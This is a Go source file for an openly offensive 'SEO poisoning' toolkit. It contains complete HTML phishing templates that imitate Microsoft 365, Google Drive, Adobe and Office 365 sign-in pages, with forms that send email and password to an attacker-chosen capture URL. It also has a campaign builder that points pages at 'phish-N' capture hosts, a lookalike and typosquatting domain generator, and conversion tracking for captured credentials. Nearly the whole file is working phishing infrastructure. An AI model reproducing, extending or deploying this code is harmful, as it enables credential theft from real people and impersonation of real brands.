// Package seo - SEO Poisoning & Landing Page Generator
// Creates fake landing pages that rank in search engines
package seo

import (
	"fmt"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
	"go.uber.org/zap"
)

// ============================================================================
// SEO Poisoning Types
// ============================================================================

type LandingPage struct {
	ID          string    `json:"id"`
	Title       string    `json:"title"`
	URL         string    `json:"url"`
	Keywords    []string  `json:"keywords"`
	TargetBrand string    `json:"target_brand"`
	Content     string    `json:"content"`
	RedirectURL string    `json:"redirect_url"`
	CreatedAt   time.Time `json:"created_at"`
	Visits      int64     `json:"visits"`
	Conversions int64     `json:"conversions"`
}

type Campaign struct {
	ID          string         `json:"id"`
	Name        string         `json:"name"`
	Pages       []*LandingPage `json:"pages"`
	Status      string         `json:"status"` // active, paused, completed
	StartedAt   time.Time      `json:"started_at"`
	TotalVisits int64          `json:"total_visits"`
}

type Poisoner struct {
	logger *zap.Logger
	pages  map[string]*LandingPage
	mu     sync.RWMutex
}

// ============================================================================
// Landing Page Templates
// ============================================================================

var landingPageTemplates = map[string]string{
	"microsoft-365-login": `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Microsoft 365 Login - Access your Office 365 account">
    <meta name="keywords" content="Microsoft 365, Office 365, login, sign in, email">
    <title>Microsoft 365 - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f2f2f2; }
        .header { background: #0078d4; padding: 20px; text-align: center; }
        .header h1 { color: white; font-size: 28px; }
        .container { max-width: 500px; margin: 50px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo img { width: 108px; height: 24px; }
        h2 { font-size: 24px; margin-bottom: 20px; color: #333; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; }
        .btn { width: 100%; padding: 12px; background: #0078d4; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; margin-top: 20px; }
        .btn:hover { background: #106ebe; }
        .footer { text-align: center; margin-top: 20px; color: #666; font-size: 12px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Microsoft 365</h1>
    </div>
    <div class="container">
        <div class="logo">
            <svg width="108" height="24" viewBox="0 0 108 24" fill="none">
                <path d="M0 12H11V0H0V12ZM12 12H24V0H12V12ZM25 12H36V0H25V12ZM37 12H48V0H37V12ZM49 12H60V0H49V12ZM61 12H72V0H61V12ZM73 12H84V0H73V12ZM85 12H96V0H85V12ZM97 12H108V0H97V12Z" fill="#737373"/>
            </svg>
        </div>
        <h2>Sign in</h2>
        <form action="{{.RedirectURL}}" method="POST">
            <input type="email" name="email" placeholder="Email, phone, or Skype" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" class="btn">Sign in</button>
        </form>
        <div class="footer">
            © Microsoft 2024
        </div>
    </div>
</body>
</html>`,

	"google-drive-share": `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Google Drive - File shared with you">
    <meta name="keywords" content="Google Drive, shared file, document, folder">
    <title>Shared with you - Google Drive</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f8f9fa; }
        .header { background: #1a73e8; padding: 20px; }
        .header h1 { color: white; }
        .container { max-width: 600px; margin: 40px auto; background: white; padding: 30px; border-radius: 8px; }
        .file-icon { font-size: 64px; text-align: center; }
        .btn { background: #1a73e8; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Google Drive</h1>
    </div>
    <div class="container">
        <div class="file-icon">📄</div>
        <h2>Document shared with you</h2>
        <p>Click below to access the shared document</p>
        <form action="{{.RedirectURL}}" method="POST">
            <input type="email" name="email" placeholder="Your email" required>
            <button type="submit" class="btn">Open in Drive</button>
        </form>
    </div>
</body>
</html>`,

	"adobe-pdf-viewer": `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="View PDF document online">
    <title>PDF Document Viewer</title>
    <style>
        body { font-family: Arial, sans-serif; background: #2b2b2b; color: white; }
        .container { max-width: 800px; margin: 50px auto; text-align: center; }
        .pdf-icon { font-size: 80px; }
        .btn { background: #ff0000; color: white; padding: 15px 30px; border: none; border-radius: 4px; cursor: pointer; font-size: 18px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="pdf-icon">📕</div>
        <h2>PDF Document</h2>
        <p>Click below to view this document</p>
        <form action="{{.RedirectURL}}" method="POST">
            <button type="submit" class="btn">View PDF</button>
        </form>
    </div>
</body>
</html>`,

	"office-365-portal": `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Office 365 Portal - Sign in to access your apps">
    <meta name="keywords" content="Office 365, portal, login, apps">
    <title>Office 365 Portal</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0078d4; }
        .container { max-width: 400px; margin: 100px auto; background: white; padding: 40px; border-radius: 8px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; }
        .btn { width: 100%; padding: 12px; background: #0078d4; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Office 365</h2>
        <form action="{{.RedirectURL}}" method="POST">
            <input type="email" name="email" placeholder="Work email">
            <input type="password" name="password" placeholder="Password">
            <button type="submit" class="btn">Sign in</button>
        </form>
    </div>
</body>
</html>`,
}

// ============================================================================
// SEO Poisoner Implementation
// ============================================================================

func NewPoisoner(logger *zap.Logger) *Poisoner {
	return &Poisoner{
		logger: logger,
		pages:  make(map[string]*LandingPage),
	}
}

// CreateLandingPage creates a new SEO poisoning landing page
func (p *Poisoner) CreateLandingPage(templateName, targetBrand, redirectURL string, keywords []string) (*LandingPage, error) {
	template, ok := landingPageTemplates[templateName]
	if !ok {
		template = landingPageTemplates["microsoft-365-login"]
	}

	// Generate unique domain
	domain := p.generateFakeDomain(targetBrand)

	page := &LandingPage{
		ID:          uuid.New().String(),
		Title:       p.generateTitle(targetBrand, templateName),
		URL:         domain,
		Keywords:    keywords,
		TargetBrand: targetBrand,
		Content:     strings.Replace(template, "{{.RedirectURL}}", redirectURL, -1),
		RedirectURL: redirectURL,
		CreatedAt:   time.Now(),
		Visits:      0,
		Conversions: 0,
	}

	p.mu.Lock()
	p.pages[page.ID] = page
	p.mu.Unlock()

	p.logger.Info("Landing page created",
		zap.String("id", page.ID),
		zap.String("url", page.URL),
		zap.String("brand", targetBrand))

	return page, nil
}

// GenerateCampaign creates a campaign with multiple landing pages
func (p *Poisoner) GenerateCampaign(name, targetBrand string, pageCount int) *Campaign {
	campaign := &Campaign{
		ID:        uuid.New().String(),
		Name:      name,
		Pages:     make([]*LandingPage, 0),
		Status:    "active",
		StartedAt: time.Now(),
	}

	templates := []string{
		"microsoft-365-login",
		"google-drive-share",
		"adobe-pdf-viewer",
		"office-365-portal",
	}

	keywords := map[string][]string{
		"microsoft365": {"microsoft 365 login", "office 365 sign in", "m365 portal", "office login"},
		"google":       {"google drive shared file", "gmail attachment", "google docs shared"},
		"adobe":       {"pdf viewer", "adobe pdf download", "view pdf online"},
		"office":      {"office 365 portal", "office login", "microsoft office sign in"},
	}

	for i := 0; i < pageCount; i++ {
		template := templates[i%len(templates)]
		kw := keywords[targetBrand]
		if len(kw) == 0 {
			kw = []string{"login", "sign in", "portal"}
		}

		page, _ := p.CreateLandingPage(template, targetBrand, fmt.Sprintf("https://phish-%d.phantom.local/capture", i), kw)
		campaign.Pages = append(campaign.Pages, page)
	}

	p.logger.Info("Campaign generated",
		zap.String("id", campaign.ID),
		zap.String("name", name),
		zap.Int("pages", len(campaign.Pages)))

	return campaign
}

// OnVisit tracks a visit to the landing page
func (p *Poisoner) OnVisit(pageID string) {
	p.mu.Lock()
	defer p.mu.Unlock()

	if page, ok := p.pages[pageID]; ok {
		page.Visits++
	}
}

// OnConversion tracks a successful credential capture
func (p *Poisoner) OnConversion(pageID string) {
	p.mu.Lock()
	defer p.mu.Unlock()

	if page, ok := p.pages[pageID]; ok {
		page.Conversions++
	}
}

// GetStats returns SEO poisoning statistics
func (p *Poisoner) GetStats() map[string]interface{} {
	p.mu.RLock()
	defer p.mu.RUnlock()

	var totalVisits int64
	var totalConversions int64

	for _, page := range p.pages {
		totalVisits += page.Visits
		totalConversions += page.Conversions
	}

	return map[string]interface{}{
		"total_pages":        len(p.pages),
		"total_visits":       totalVisits,
		"total_conversions":  totalConversions,
		"conversion_rate":    func() float64 {
			if totalVisits == 0 {
				return 0
			}
			return float64(totalConversions) / float64(totalVisits) * 100
		}(),
	}
}

// ============================================================================
// Helper Functions
// ============================================================================

func (p *Poisoner) generateFakeDomain(brand string) string {
	brands := map[string][]string{
		"microsoft365": {"microsoft-login", "office365-portal", "m365-signin", "officeonline-login"},
		"google":       {"gdocs-share", "gdrive-view", "gmail-files", "google-docs-login"},
		"adobe":        {"pdf-viewer", "adobe-files", "document-view", "pdf-download"},
		"okta":         {"okta-login", "sso-portal", "idp-login", "auth-okta"},
	}

	domains, ok := brands[strings.ToLower(brand)]
	if !ok {
		domains = []string{"portal-login", "secure-auth", "account-signin"}
	}

	domain := domains[time.Now().UnixNano()%int64(len(domains))]
	tlds := []string{"com", "net", "org", "xyz", "io"}
	tld := tlds[time.Now().UnixNano()%int64(len(tlds))]

	return fmt.Sprintf("https://%s.%s", domain, tld)
}

func (p *Poisoner) generateTitle(brand, template string) string {
	titles := map[string]string{
		"microsoft-365-login": "Microsoft 365 - Sign In",
		"google-drive-share":  "Google Drive - File Shared With You",
		"adobe-pdf-viewer":   "PDF Document Viewer",
		"office-365-portal":  "Office 365 Portal - Sign In",
	}

	title, ok := titles[template]
	if !ok {
		title = fmt.Sprintf("%s - Login", brand)
	}

	return title
}

// GenerateSEOContent generates SEO-optimized content
func GenerateSEOContent(keywords []string, wordCount int) string {
	templates := []string{
		"Find the latest updates and resources related to %s. Access your account securely and manage your settings online.",
		"Welcome to the official portal for %s. Sign in to access your documents, emails, and collaborate with your team.",
		"Secure login for %s. Manage your account settings, view notifications, and stay connected.",
		"Access your %s account here. View shared documents, check your email, and manage your profile.",
	}

	if len(keywords) == 0 {
		keywords = []string{"login", "portal", "account"}
	}

	keyword := keywords[0]
	template := templates[time.Now().UnixNano()%int64(len(templates))]

	return fmt.Sprintf(template, keyword)
}

// ============================================================================
// Typosquatting Domain Generator
// ============================================================================

type Typosquatter struct {
	logger *zap.Logger
}

func NewTyposquatter(logger *zap.Logger) *Typosquatter {
	return &Typosquatter{logger: logger}
}

// GenerateTyposquattingDomains generates typosquatting domains
func (t *Typosquatter) GenerateTyposquattingDomains(targetDomain string) []string {
	// Common typosquatting techniques
	techniques := []struct {
		name   string
		transform func(string) string
	}{
		{"addition", func(s string) string { return s[:1] + "a" + s[1:] }},
		{"omission", func(s string) string { if len(s) > 2 { return s[:1] + s[2:] }; return s }},
		{"transposition", func(s string) string { if len(s) > 2 { return s[:1] + s[2:3] + s[1:2] + s[3:] }; return s }},
		{"repetition", func(s string) string { if len(s) > 1 { return s[:2] + string(s[1]) + s[2:] }; return s }},
		{"hyphenation", func(s string) string { return s[:1] + "-" + s[1:] }},
		{"subdomain", func(s string) string { return "login." + s }},
		{"double-domain", func(s string) string { return s + "." + s }},
		{"number-replacement", func(s string) string { 
			replacements := map[rune]rune{'o': '0', 'l': '1', 'i': '1', 'e': '3', 'a': '4', 's': '5'}
			result := ""
			for _, c := range s {
				if r, ok := replacements[c]; ok {
					result += string(r)
				} else {
					result += string(c)
				}
			}
			return result
		}},
	}

	var domains []string
	parts := strings.Split(targetDomain, ".")
	domain := parts[0]
	tld := ""
	if len(parts) > 1 {
		tld = parts[1]
	}

	for _, tech := range techniques {
		newDomain := tech.transform(domain)
		domainVariant := newDomain + "." + tld
		if domainVariant != targetDomain {
			domains = append(domains, domainVariant)
		}
	}

	// Add common TLD variations
	tldVariations := []string{"com", "net", "org", "io", "co", "info", "biz"}
	for _, newTLD := range tldVariations {
		if newTLD != tld {
			domains = append(domains, domain+"."+newTLD)
		}
	}

	t.logger.Info("Typosquatting domains generated",
		zap.String("target", targetDomain),
		zap.Int("count", len(domains)))

	return domains
}
